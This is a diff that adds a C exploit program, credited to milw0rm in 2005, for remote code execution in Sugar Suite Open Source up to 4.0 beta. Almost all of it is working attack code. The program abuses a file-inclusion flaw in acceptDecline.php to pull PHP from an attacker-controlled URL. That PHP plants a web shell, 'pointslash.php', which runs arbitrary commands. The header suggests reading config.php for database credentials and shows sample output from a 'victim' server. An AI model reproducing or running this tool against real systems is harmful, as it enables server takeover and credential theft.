@@ -1,0 +1,145 @@
+/*
+
+gcc -o sugar sugar.c
+
+Usage ./sugar [host] [/path/] [site] [cmd]
+
+Sugar Suite Open Source <= 4.0 beta remote code execution (c code)
+coded by: pointslash v.
+credits: rgod, unitedasia
+
+host - hostname (ex: www.sitename.com)
+path - path (ex: /sugar/ or just / )
+site - remote location ( ex: http://www.somesite.com/file.txt)
+cmd  - specify a command ("cat config.php" to see database username & password)
+
+example ./sugar www.victim.com /CRM35/ http://othersite.com/file.txt uname%20-a;
+
+Put this in your file.txt
+
+<?php
+$fp=fopen("pointslash.php","w");
+fputs($fp,"<? error_reporting(0);ini_set('max_execution_time',0); system(\$HTTP_GET_VARS[cmd]);?>");
+fclose($fp);
+?>
+
+./sugar  www.victim.com /CRM35/ http://othersite.com/file.txt ls%20-al
+
+HTTP/1.1 200 OK
+Date: Thu, 08 Dec 2005 12:35:33 GMT
+Server: Apache/1.3.27 (Unix)  (Red-Hat/Linux) PHP/4.3.10 mod_perl/1.27
+X-Powered-By: PHP/4.3.10
+Connection: close
+Content-Type: text/html
+
+Linux victim.com 2.4.9-e.57smp #1 SMP Thu Dec 2 20:51:12 EST 2004 i686 unknown
+
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#define HTTP_PORT 80
+
+
+#define DATA "\ncompile gcc -o sugar sugar.c\n\nexample ./sugar www.victim.com /CRM35/ http://othersite.com/file.txt uname%%20-a;\n\nPut this in your file.txt\n\n<?php\n$fp=fopen(\"pointslash.php\",\"w\");\nfputs($fp,\"<? error_reporting(0);ini_set('max_execution_time',0); system(\\$HTTP_GET_VARS[cmd]);?>\");\nfclose($fp);\n?>\n\n"
+
+
+/****************** MAIN *********************/
+
+void sendpacket(char buffer[8192], int p, char host[100]);
+
+
+int main( int argc, char **argv)
+{
+
+    char buffer[8192];
+    int count;
+    char data[190];
+    if(argc<5)
+    {
+         printf("Usage %s [host] [/path/] [site] [cmd]\n\nSugar Suite Open Source <= 4.0 beta remote code execution (c code)\ncoded by: pointslash \ncredits: rgod, unitedasia\n\n",argv[0]);
+         printf("host - hostname (ex:www.sitename.com)\n");
+         printf("path - path (ex: /sugar/ or just / )\n");
+         printf("site - remote location ( ex: http://www.somesite.com/file.txt)\n");
+         printf("cmd  - specify a command (\"cat config.php\" to see database username & password)\n");
+         sprintf(data, DATA);
+         printf(data);
+         exit(1);
+    }
+
+
+    sprintf( buffer, "GET %sacceptDecline.php?beanFiles[1]=%s&beanList[1]=1&module=1 HTTP/1.0\nUser-Agent: MantraAgent\nHost: %s\nConnection: Close\n\n", argv[2], argv[3], argv[1]);
+
+    sendpacket(buffer,0,argv[1]);
+
+    sprintf( buffer, "GET %spointslash.php?cmd=%s HTTP/1.0\nUser-Agent: Vagabondo/2.0 MT\nHost: %s\nConnection: Close\n\n", argv[2], argv[4], argv[1]);
+
+    sendpacket(buffer,1,argv[1]);
+
+    return count;
+}
+
+void sendpacket(char buffer[8192], int p, char host[100])
+{
+
+    struct sockaddr_in server;
+    struct hostent *host_info;
+    unsigned long addr;
+    int sock;
+    char dat[8192];
+    int count;
+
+    /* create socket */
+    sock = socket( PF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror( "failed to create socket");
+        exit(1);
+    }
+
+    /* Create socketadress of Server
+     * it is type, IP-adress and portnumber */
+    memset( &server, 0, sizeof (server));
+
+    /* convert the Servername to a IP-Adress */
+    host_info = gethostbyname( host);
+    if (NULL == host_info) {
+        fprintf( stderr, "unknown server: %s\n", host);
+        exit(1);
+    }
+    memcpy( (char *)&server.sin_addr, host_info->h_addr, host_info->h_length);
+
+    server.sin_family = AF_INET;
+    server.sin_port = htons( HTTP_PORT);
+
+
+    /* connect to the server */
+    if ( connect( sock, (struct sockaddr*)&server, sizeof( server)) < 0) {
+        perror( "can't connect to server");
+        exit(1);
+    }
+
+    send( sock, buffer, strlen( buffer), 0);
+
+    /* get the answer from server and put it out to stdout */
+    if (p==1) {
+      do {
+          count = recv( sock, buffer, sizeof(buffer), 0);
+          write( 1, buffer, count);
+      }
+      while (count > 0);
+    }
+
+    /* close the connection to the server */
+    close ( sock);
+
+}
+
+// milw0rm.com [2005-12-08]
